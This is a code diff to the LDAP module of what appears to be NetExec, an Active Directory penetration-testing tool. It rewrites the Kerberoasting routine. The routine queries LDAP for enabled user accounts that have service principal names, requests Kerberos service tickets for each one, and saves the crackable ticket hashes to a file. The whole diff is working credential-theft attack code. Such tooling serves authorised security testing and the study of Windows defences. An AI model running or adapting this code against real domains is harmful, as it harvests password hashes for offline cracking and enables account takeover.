@@ -866,11 +866,11 @@ class ldap(connection):
         # Building the search filter
         searchFilter = "(&(servicePrincipalName=*)(!(objectCategory=computer)))"
         attributes = [
-            "servicePrincipalName",
             "sAMAccountName",
-            "pwdLastSet",
-            "MemberOf",
             "userAccountControl",
+            "servicePrincipalName",
+            "MemberOf",
+            "pwdLastSet",
             "lastLogon",
         ]
         resp = self.search(searchFilter, attributes, 0)
@@ -878,86 +878,58 @@ class ldap(connection):
         self.logger.debug(f"Search Filter: {searchFilter}")
         self.logger.debug(f"Attributes: {attributes}")
         self.logger.debug(f"Response: {resp_parsed}")
+
         if not resp_parsed:
             self.logger.highlight("No entries found!")
         else:
-            answers = []
+            # Filter disabled accounts
+            disabled_accounts = [x for x in resp_parsed if int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+            for account in disabled_accounts:
+                self.logger.display(f"Skipping disabled account: {account['sAMAccountName']}")
 
-            for item in resp_parsed:
-                mustCommit = False
-                sAMAccountName = ""
-                memberOf = ""
-                SPNs = []
-                pwdLastSet = ""
-                userAccountControl = 0
-                lastLogon = "N/A"
-                delegation = ""
-                try:
-                    sAMAccountName = item.get("sAMAccountName", "")
-                    mustCommit = sAMAccountName is not None
-                    userAccountControl = int(item.get("userAccountControl", 0))
-                    memberOf = str(item.get("memberOf", " "))
-                    if userAccountControl & UF_TRUSTED_FOR_DELEGATION:
-                        delegation = "unconstrained"
-                    elif userAccountControl & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
-                        delegation = "constrained"
-                    pwdLastSet = "<never>" if str(item.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("pwdLastSet", 0))))))
-                    lastLogon = "<never>" if str(item.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(str(item.get("lastLogon", 0))))))
-                    SPNs = [str(spn) for spn in item.get("servicePrincipalName")]
+            # Get all enabled accounts
+            enabled = [x for x in resp_parsed if not int(x["userAccountControl"]) & UF_ACCOUNTDISABLE]
+            self.logger.display(f"Total of records returned {len(enabled):d}")
 
-                    if mustCommit is True:
-                        if int(userAccountControl) & UF_ACCOUNTDISABLE:
-                            self.logger.highlight(f"Bypassing disabled account {sAMAccountName} ")
-                        else:
-                            answers += [[spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation] for spn in SPNs]
-                except Exception as e:
-                    nxc_logger.error(f"Skipping item, cannot process due to error {e!s}")
-
-            if len(answers) > 0:
-                self.logger.display(f"Total of records returned {len(answers):d}")
+            for user in enabled:
+                # Perform Kerberos Attack
                 TGT = KerberosAttacks(self).get_tgt_kerberoasting(self.use_kcache)
                 self.logger.debug(f"TGT: {TGT}")
                 if TGT:
-                    dejavue = []
-                    for (_SPN, sAMAccountName, memberOf, pwdLastSet, lastLogon, _delegation) in answers:
-                        if sAMAccountName not in dejavue:
-                            downLevelLogonName = self.targetDomain + "\\" + sAMAccountName
+                    downLevelLogonName = f"{self.targetDomain}\\{user['sAMAccountName']}"
+                    try:
+                        principalName = Principal()
+                        principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
+                        principalName.components = [downLevelLogonName]
 
-                            try:
-                                principalName = Principal()
-                                principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
-                                principalName.components = [downLevelLogonName]
+                        tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
+                            principalName,
+                            self.domain,
+                            self.kdcHost,
+                            TGT["KDC_REP"],
+                            TGT["cipher"],
+                            TGT["sessionKey"],
+                        )
+                        out = KerberosAttacks(self).output_tgs(
+                            tgs,
+                            oldSessionKey,
+                            sessionKey,
+                            user["sAMAccountName"],
+                            downLevelLogonName,
+                        )
 
-                                tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
-                                    principalName,
-                                    self.domain,
-                                    self.kdcHost,
-                                    TGT["KDC_REP"],
-                                    TGT["cipher"],
-                                    TGT["sessionKey"],
-                                )
-                                r = KerberosAttacks(self).output_tgs(
-                                    tgs,
-                                    oldSessionKey,
-                                    sessionKey,
-                                    sAMAccountName,
-                                    self.targetDomain + "/" + sAMAccountName,
-                                )
-                                self.logger.highlight(f"sAMAccountName: {sAMAccountName} memberOf: {memberOf} pwdLastSet: {pwdLastSet} lastLogon:{lastLogon}")
-                                self.logger.highlight(f"{r}")
-                                if self.args.kerberoasting:
-                                    with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
-                                        hash_kerberoasting.write(r + "\n")
-                                dejavue.append(sAMAccountName)
-                            except Exception as e:
-                                self.logger.debug("Exception:", exc_info=True)
-                                self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
-                    return True
+                        pwdLastSet = "<never>" if str(user.get("pwdLastSet", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["pwdLastSet"]))))
+                        lastLogon = "<never>" if str(user.get("lastLogon", 0)) == "0" else str(datetime.fromtimestamp(self.getUnixTime(int(user["lastLogon"]))))
+                        self.logger.display(f"sAMAccountName: {user['sAMAccountName']}, memberOf: {user.get('memberOf', [])}, pwdLastSet: {pwdLastSet}, lastLogon: {lastLogon}")
+                        self.logger.highlight(f"{out}")
+                        if self.args.kerberoasting:
+                            with open(self.args.kerberoasting, "a+") as hash_kerberoasting:
+                                hash_kerberoasting.write(out + "\n")
+                    except Exception as e:
+                        self.logger.debug(f"Exception: {e}", exc_info=True)
+                        self.logger.fail(f"Principal: {downLevelLogonName} - {e}")
                 else:
                     self.logger.fail(f"Error retrieving TGT for {self.username}\\{self.domain} from {self.kdcHost}")
-            else:
-                self.logger.highlight("No entries found!")
-        self.logger.fail("Error with the LDAP account used")
 
     def query(self):
         """
